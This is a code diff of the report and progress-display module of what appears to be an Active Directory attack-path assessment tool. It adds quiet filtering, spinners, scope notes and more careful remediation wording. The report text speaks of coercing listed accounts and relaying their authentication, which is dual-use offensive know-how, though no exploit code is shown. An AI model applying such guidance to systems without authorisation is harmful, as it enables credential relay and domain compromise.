-        _print_plain_summary_table(results)
+        _print_plain_summary_table(display, quiet=quiet, suppressed=suppressed)
 
 
-def print_verbose_details(results: list[AttackResult], verbose: bool = False) -> None:
-    """Print per-check detail tables.  Always call *after* print_attack_paths()."""
+def print_verbose_details(results: list[AttackResult], verbose: bool = False,
+                          quiet: bool = False) -> None:
+    """Print per-check detail tables.  Always call *after* print_attack_paths().
+
+    When ``quiet=True`` NOT VIABLE and UNKNOWN module blocks are omitted entirely.
+    """
     if not verbose:
         if RICH_AVAILABLE:
             Console().print("\n[dim]Run with [bold]-v[/bold] for per-check details.[/]")
         else:
             print("\nRun with -v for per-check details.")
         return
+    display = [r for r in results if r.viability not in _HIDDEN_IN_QUIET] if quiet else results
     if RICH_AVAILABLE:
-        _print_rich_verbose_details(results)
+        _print_rich_verbose_details(display, quiet=quiet)
     else:
-        _print_plain_verbose_details(results)
+        _print_plain_verbose_details(display, quiet=quiet)
 
 
-def _print_rich_summary_table(results: list[AttackResult]) -> None:
+def _print_rich_summary_table(results: list[AttackResult],
+                              quiet: bool = False,
+                              suppressed: int = 0) -> None:
     """Rich: viability summary table only."""
     console = Console()
 
@@ -705,7 +1048,6 @@ def _print_rich_summary_table(results: list[AttackResult]) -> None:
     for ar in results:
         style, label = VIABILITY_STYLE.get(ar.viability, ("dim", ar.viability))
         failed  = ", ".join(ar.missing) or "—"
-        # Combine: optional FAILs first (explain PARTIAL), then WARNs, then SKIPs
         notices = []
         notices += ar.optional_failed
         notices += [c.name for c in ar.checks if c.status == Status.WARN]
@@ -719,16 +1061,21 @@ def _print_rich_summary_table(results: list[AttackResult]) -> None:
         )
 
     console.print(tbl)
+    if quiet and suppressed:
+        console.print(f"[dim]({suppressed} NOT VIABLE / UNKNOWN module(s) hidden — "
+                      f"run without -q to see all)[/]")
 
 
-def _print_rich_verbose_details(results: list[AttackResult]) -> None:
+def _print_rich_verbose_details(results: list[AttackResult],
+                                quiet: bool = False) -> None:
     """Rich: per-check detail table (shown after attack paths when -v is set)."""
     console = Console()
 
     console.print()
     console.print(Panel.fit(
         "[bold white]Per-Check Details[/]\n"
-        "[dim]Full check output for all attack modules[/]",
+        "[dim]Full check output for all attack modules[/]"
+        + (" [dim](NOT VIABLE / UNKNOWN modules hidden)[/]" if quiet else ""),
         border_style="blue",
     ))
     console.print()
@@ -768,7 +1115,9 @@ def _print_rich_verbose_details(results: list[AttackResult]) -> None:
     console.print(dtbl)
 
 
-def _print_plain_summary_table(results: list[AttackResult]) -> None:
+def _print_plain_summary_table(results: list[AttackResult],
+                               quiet: bool = False,
+                               suppressed: int = 0) -> None:
     """Plain-text: viability summary table only."""
     sep = "=" * 80
     print(f"\n{sep}")
@@ -787,11 +1136,16 @@ def _print_plain_summary_table(results: list[AttackResult]) -> None:
         if notices:
             print(f"  {'':42} {'':14} Warnings/Optional/Skipped: {notices_str}")
 
+    if quiet and suppressed:
+        print(f"\n({suppressed} NOT VIABLE / UNKNOWN module(s) hidden — run without -q to see all)")
     print()
 
 
-def _print_plain_verbose_details(results: list[AttackResult]) -> None:
+def _print_plain_verbose_details(results: list[AttackResult],
+                                 quiet: bool = False) -> None:
     """Plain-text: per-check detail dump."""
+    if quiet:
+        print("\n--- Per-Check Details (NOT VIABLE / UNKNOWN modules hidden) ---")
     for ar in results:
         print(f"\n{'─'*80}\n{ar.attack_name}")
         for c in ar.checks:
@@ -816,7 +1170,7 @@ def _print_rich_relay_targets(summary: RelayTargetSummary) -> None:
 
     console.print()
     console.print(Panel.fit(
-        "[bold white]Relay Target Candidates[/]\n"
+        "[bold white]Coercion Target Candidates[/]\n"
         "[dim]Accounts with ACL rights that make them valuable coercion targets[/]",
         border_style="cyan",
     ))
@@ -875,7 +1229,7 @@ def _print_rich_relay_targets(summary: RelayTargetSummary) -> None:
 def _print_plain_relay_targets(summary: RelayTargetSummary) -> None:
     sep = "=" * 90
     print(f"\n{sep}")
-    print("  RELAY TARGET CANDIDATES")
+    print("  COERCION TARGET CANDIDATES")
     print(sep)
 
     if summary.skipped:
@@ -923,6 +1277,17 @@ def write_markdown_report(
     a("")
     a("---")
     a("")
+
+    # ── Scope notes (ROE / discovered-DC probing) ──────────────────
+    _scope_notes = env_summary.get("scope_notes") or []
+    if _scope_notes:
+        a("## Scope Notes")
+        a("")
+        for _sn in _scope_notes:
+            a(f"> {_sn}")
+            a("")
+        a("---")
+        a("")
 
     # ── Executive summary table ────────────────────────────────────
     a("## Executive Summary")
@@ -1012,11 +1377,11 @@ def write_markdown_report(
 
         a("")
 
-    # ── Relay target candidates ────────────────────────────────────
+    # ── Coercion target candidates ─────────────────────────────────
     if relay_target_summary is not None:
         a("---")
         a("")
-        a("## Relay Target Candidates")
+        a("## Coercion Target Candidates")
         a("")
         if relay_target_summary.skipped:
             a(f"> ⚠ Skipped: {relay_target_summary.skipped}")
@@ -1090,8 +1455,9 @@ def _build_remediation(results: list[AttackResult]) -> list[tuple[str, str]]:
             if c.status not in (Status.PASS, Status.WARN):
                 continue
             # Skip if the overall attack is not viable — a PASS on a sub-check
-            # in a NOT VIABLE attack doesn't mean that specific vector is exploitable
-            if ar.viability == "NOT VIABLE":
+            # in a NOT VIABLE attack doesn't mean that specific vector is
+            # exploitable. UNKNOWN (nothing testable) is likewise not actionable.
+            if ar.viability in ("NOT VIABLE", "UNKNOWN"):
                 continue
             for keyword, rec in remediations.items():
                 if keyword in c.name.lower() and keyword not in seen:
@@ -1099,7 +1465,21 @@ def _build_remediation(results: list[AttackResult]) -> list[tuple[str, str]]:
                     seen.add(keyword)
 
     if not recs:
-        recs.append(("No exploitable findings", "No viable attack prerequisites confirmed. Environment appears hardened against the checked attack vectors."))
+        if any(ar.viability == "UNKNOWN" for ar in results):
+            recs.append((
+                "Could not fully assess",
+                "One or more attack paths could not be evaluated (target "
+                "unreachable, credentials rejected, or required tooling absent) — "
+                "see the UNKNOWN module(s) above. This is NOT a clean bill of "
+                "health; resolve the gaps and re-run before concluding the "
+                "environment is hardened.",
+            ))
+        else:
+            recs.append((
+                "No exploitable findings",
+                "No viable attack prerequisites confirmed. Environment appears "
+                "hardened against the checked attack vectors.",
+            ))
 
     return recs
 
@@ -1125,6 +1505,8 @@ def write_json_report(
         "dc_ip":     env_summary.get("dc_ip", ""),
         "user":      env_summary.get("user", ""),
         "extra_targets": env_summary.get("extra_targets", []),
+        "dc_ip_only":    bool(env_summary.get("dc_ip_only", False)),
+        "scope_notes":   env_summary.get("scope_notes", []),
         "results": [],
     }
 
@@ -1239,21 +1621,170 @@ def write_laps_scope(results: list[AttackResult], output_path: str) -> int:
 # ── Progress display ───────────────────────────────────────────────────────
 
 class CheckProgress:
-    """Live progress display for checks as they run."""
+    """Live progress display for checks as they run.
 
-    def __init__(self, verbose: bool = False):
+    Sequential runs report progress per module via three lifecycle hooks —
+    ``module_started`` / ``update`` / ``module_finished`` — with the
+    presentation depending on the terminal capabilities:
+
+      * rich, non-verbose: a single live spinner per module
+        ("Module X/Y: <name>... (N checks)"), replaced by a one-line
+        viability verdict when the module finishes. Per-check output is
+        buffered (the spinner only shows a running count) so the spinner and
+        ``print()`` never interleave.
+      * rich, verbose: a "▶ Module X/Y: <name>" header, then one streamed
+        line per check as results arrive (unchanged in substance from before).
+      * plain (no rich): "[X/Y] <name>... <verdict>" on one line, with a dot
+        per check in non-verbose mode.
+
+    Quiet mode (``quiet=True``, from ``-q``) suppresses NOT VIABLE modules from
+    the *live* non-verbose display, mirroring how ``-q`` already drops them from
+    the final summary table. In rich non-verbose the spinner still shows for
+    every module (live feedback), but a NOT VIABLE module's spinner is simply
+    erased with no verdict line left behind. In plain non-verbose the per-module
+    line is deferred until the verdict is known and only emitted for non-NOT
+    VIABLE modules. Quiet does not alter verbose live output (per-check lines are
+    already streamed by the time the verdict is known); ``-q`` continues to
+    filter the final verbose detail section instead.
+
+    Parallel runs can't show a spinner per module (they all run at once), so
+    ``parallel_start`` prints a single "running N modules in parallel" banner
+    and the module lifecycle hooks are no-ops; the summary table that follows
+    carries the per-module verdicts (already quiet-filtered). In parallel
+    verbose mode the per-check lines still stream (interleaved), as before.
+    """
+
+    def __init__(self, verbose: bool = False, module_total: int = 0,
+                 parallel: bool = False, quiet: bool = False):
         self.verbose = verbose
+        self.module_total = module_total
+        self.parallel = parallel
+        self.quiet = quiet
         self._console = Console(stderr=True) if RICH_AVAILABLE else None
         self._current_attack = ""
+        self._module_prefix = ""      # "Module X/Y" for the active module
+        self._idx = 0                 # active module's 1-based index
+        self._total = 0               # total module count
+        self._check_count = 0
+        self._live = None             # rich.live.Live while a module runs
+        self._spinner = None          # rich.spinner.Spinner inside the Live
+        self._parallel_done = 0       # modules completed so far in a parallel run
 
-    def update(self, attack_name: str, check_name: str, result) -> None:
-        if not self.verbose and not RICH_AVAILABLE:
-            # Print a simple dot
-            print(".", end="", flush=True)
+    # ── parallel banner + live counter ────────────────────────────
+    def parallel_start(self, total: int) -> None:
+        """Start a live 'X/N done' counter for a parallel run.
+
+        In verbose mode the per-check lines stream to the same console, so a
+        Live spinner would corrupt them. In that case print a static banner
+        and leave the streaming lines to speak for themselves.
+        """
+        self._total = total
+        self._parallel_done = 0
+        if RICH_AVAILABLE:
+            if self.verbose:
+                # Static banner only — Live + streaming Console.print don't mix.
+                self._console.print(
+                    f"[dim]Running [cyan]{total}[/] modules in parallel...[/]",
+                    highlight=False,
+                )
+            else:
+                from rich.live import Live
+                from rich.spinner import Spinner
+                self._spinner = Spinner(
+                    "dots",
+                    text=f"[dim]Running [cyan]{total}[/] modules in parallel... "
+                         f"[dim](0/{total} done)[/]",
+                )
+                self._live = Live(self._spinner, console=self._console,
+                                  transient=False, refresh_per_second=12)
+                self._live.start()
+        else:
+            print(f"[*] Running {total} modules in parallel... ", end="", flush=True)
+
+    def parallel_module_finished(self, attack_name: str, ar) -> None:
+        """Called (under the engine lock) each time a parallel module completes."""
+        self._parallel_done += 1
+        done, total = self._parallel_done, self._total
+        if RICH_AVAILABLE:
+            if self.verbose:
+                # No spinner to update; print a completion note on the last module.
+                if done == total:
+                    self._console.print(
+                        f"\n[dim]Parallel run complete — {total} modules checked.[/]",
+                        highlight=False,
+                    )
+            elif self._spinner is not None:
+                self._spinner.update(
+                    text=f"[dim]Running [cyan]{total}[/] modules in parallel... "
+                         f"[dim]({done}/{total} done)[/]"
+                )
+                if done == total:
+                    self._stop_live()
+                    self._console.print(
+                        f"[dim]Parallel run complete — {total} modules checked.[/]",
+                        highlight=False,
+                    )
+        else:
+            if done == total:
+                print(f"{total}/{total}", flush=True)
+
+    # ── module lifecycle (sequential only) ─────────────────────────
+    def module_started(self, attack_name: str, index: int, total: int) -> None:
+        self._current_attack = attack_name
+        self._module_prefix = f"Module {index}/{total}"
+        self._idx = index
+        self._total = total
+        self._check_count = 0
+        if self.parallel:
             return
 
-        if RICH_AVAILABLE and self.verbose:
+        if not RICH_AVAILABLE:
+            if self.verbose:
+                print(f"\n> {self._module_prefix}: {attack_name}")
+            elif not self.quiet:
+                # Quiet defers the whole line to module_finished (verdict unknown
+                # here, so a NOT VIABLE module can't yet be suppressed).
+                print(f"[{index}/{total}] {attack_name}... ", end="", flush=True)
+            return
+
+        if self.verbose:
+            self._console.print(
+                f"\n[bold cyan]▶ {self._module_prefix}: {attack_name}[/]",
+                highlight=False,
+            )
+        else:
+            from rich.live import Live
+            from rich.spinner import Spinner
+            self._spinner = Spinner(
+                "dots",
+                text=f"[cyan]{self._module_prefix}:[/] {attack_name}...",
+            )
+            self._live = Live(self._spinner, console=self._console,
+                              transient=True, refresh_per_second=12)
+            self._live.start()
+
+    def update(self, attack_name: str, check_name: str, result) -> None:
+        # Parallel non-verbose: stay silent (the banner + summary table cover it).
+        if self.parallel and not self.verbose:
+            return
+
+        if not RICH_AVAILABLE:
+            if self.verbose:
+                # In parallel there is no module_started header — print one
+                # when the active attack changes so lines stay attributable.
+                if self.parallel and attack_name != self._current_attack:
+                    print(f"\n> {attack_name}")
+                    self._current_attack = attack_name
+                label = STATUS_PLAIN.get(result.status, str(result.status))
+                print(f"  {label:<6} {check_name}")
+            elif not self.quiet:
+                # No header was printed under quiet, so a dot would be orphaned.
+                print(".", end="", flush=True)
+            return
+
+        if self.verbose:
             style, label = STATUS_STYLE.get(result.status, ("dim", str(result.status)))
+            # Header here only fires in parallel; sequential set it in module_started.
             if attack_name != self._current_attack:
                 self._console.print(f"\n[bold cyan]▶ {attack_name}[/]")
                 self._current_attack = attack_name
@@ -1261,11 +1792,68 @@ class CheckProgress:
                 f"  [{style}]{label:<8}[/] {check_name}",
                 highlight=False,
             )
-        elif RICH_AVAILABLE:
-            if attack_name != self._current_attack:
-                self._console.print(f"[dim]Checking:[/] [cyan]{attack_name}[/]...",
-                                    end="", highlight=False)
-                self._current_attack = attack_name
+        else:
+            # Non-verbose rich, sequential: buffer the result, just bump the
+            # count shown on the spinner. Never print() here — it would corrupt
+            # the live spinner line.
+            self._check_count += 1
+            if self._spinner is not None:
+                plural = "check" if self._check_count == 1 else "checks"
+                self._spinner.update(
+                    text=f"[cyan]{self._module_prefix}:[/] {self._current_attack} "
+                         f"[dim]({self._check_count} {plural})[/]"
+                )
+
+    def module_finished(self, attack_name: str, ar) -> None:
+        if self.parallel:
+            return
+
+        suppress = self.quiet and not self.verbose and ar.viability in _HIDDEN_IN_QUIET
+        vstyle, vlabel = VIABILITY_STYLE.get(ar.viability, ("dim", ar.viability))
+
+        if not RICH_AVAILABLE:
+            if self.verbose:
+                print(f"  => {ar.viability}")
+            elif self.quiet:
+                # Header was deferred; emit the complete line, or nothing if
+                # this module is being suppressed.
+                if not suppress:
+                    print(f"[{self._idx}/{self._total}] {attack_name}... "
+                          f"{ar.viability}", flush=True)
+            else:
+                # Completes the "[X/Y] <name>... " line opened in module_started.
+                print(ar.viability, flush=True)
+            return
+
+        if self.verbose:
+            self._console.print(
+                f"  [dim]{self._module_prefix} verdict:[/] [{vstyle}]{vlabel}[/]",
+                highlight=False,
+            )
+            return
+
+        # Non-verbose rich: stop the spinner (erased — transient). Under quiet a
+        # NOT VIABLE module leaves nothing behind; otherwise print the verdict.
+        self._stop_live()
+        if suppress:
+            return
+        self._console.print(
+            f"  [{vstyle}]{vlabel}[/]  [dim]·[/] {self._module_prefix}: {attack_name}",
+            highlight=False,
+        )
+
+    def flush(self) -> None:
+        """Tear down any live spinner left running (e.g. on early exit)."""
+        self._stop_live()
+
+    def _stop_live(self) -> None:
+        if self._live is not None:
+            try:
+                self._live.stop()
+            except Exception:
+                pass
+            self._live = None
+            self._spinner = None
 
 
 # ── HTML report ────────────────────────────────────────────────────────────
@@ -1404,20 +1992,20 @@ def write_html_report(
     Prioritised chains based on viable prerequisites. Commands use real values where available.
   </p>{paths_html}"""
 
-    # ── relay target candidates section ───────────────────────────
+    # ── coercion target candidates section ────────────────────────
     relay_targets_html = ""
     if relay_target_summary is not None:
         if relay_target_summary.skipped:
             relay_targets_html = f"""
-  <h2>Relay Target Candidates</h2>
+  <h2>Coercion Target Candidates</h2>
   <p style="color:#f6ad55;font-size:13px;">⚠ Skipped: {esc(relay_target_summary.skipped)}</p>"""
         elif relay_target_summary.error:
             relay_targets_html = f"""
-  <h2>Relay Target Candidates</h2>
+  <h2>Coercion Target Candidates</h2>
   <p style="color:#fc8181;font-size:13px;">✗ Error: {esc(relay_target_summary.error)}</p>"""
         elif not relay_target_summary.entries:
             relay_targets_html = """
-  <h2>Relay Target Candidates</h2>
+  <h2>Coercion Target Candidates</h2>
   <p style="color:#718096;font-size:13px;">No relay-worthy ACL paths found with the enumeration credential.</p>"""
         else:
             ATTACK_COLOURS = {
@@ -1441,7 +2029,7 @@ def write_html_report(
         </tr>"""
 
             relay_targets_html = f"""
-  <h2>Relay Target Candidates</h2>
+  <h2>Coercion Target Candidates</h2>
   <p style="font-size:12px;color:#718096;margin-bottom:12px;">
     Accounts with ACL rights that make them valuable coercion targets.
     Coerce any listed account and relay its authentication to the indicated attack.
@@ -1476,6 +2064,21 @@ def write_html_report(
     dc_ip    = esc(env_summary.get("dc_ip", "N/A"))
     user     = esc(env_summary.get("user", "N/A"))
 
+    # Scope / ROE notes — rendered as a callout only when present.
+    _scope_notes = env_summary.get("scope_notes") or []
+    if _scope_notes:
+        _sn_items = "".join(
+            f'      <div class="scope-note-item">{esc(n)}</div>\n' for n in _scope_notes
+        )
+        scope_notes_html = (
+            '\n  <div class="scope-notes">\n'
+            '    <div class="scope-notes-title">🔍 Scope Notes</div>\n'
+            f"{_sn_items}"
+            "  </div>\n"
+        )
+    else:
+        scope_notes_html = ""
+
     html = f"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -1505,6 +2108,17 @@ def write_html_report(
 
   /* ── Layout ── */
   .container {{ max-width: 1200px; margin: 0 auto; }}
+
+  /* ── Scope notes (ROE / discovered-DC probing) ── */
+  .scope-notes {{
+    border-left: 4px solid #ecc94b;
+    background: #211f16;
+    padding: 12px 16px;
+    border-radius: 0 8px 8px 0;
+    margin-bottom: 28px;
+  }}
+  .scope-notes-title {{ font-weight: 600; color: #ecc94b; margin-bottom: 6px; }}
+  .scope-note-item {{ color: #cbd5e0; margin: 4px 0; }}
 
   /* ── Header ── */
   .report-header {{
@@ -1688,7 +2302,7 @@ def write_html_report(
       <div class="meta-item"><strong>Extra Targets:</strong> <code>{esc(extra_targets)}</code></div>
     </div>
   </div>
-
+{scope_notes_html}
   <!-- Executive Summary -->
   <h2>Executive Summary</h2>
   <div class="summary-wrapper">
@@ -1713,7 +2327,7 @@ def write_html_report(
   <!-- Recommended Attack Paths -->
   {attack_paths_html}
 
-  <!-- Relay Target Candidates -->
+  <!-- Coercion Target Candidates -->
   {relay_targets_html}
 
   <!-- Remediation -->
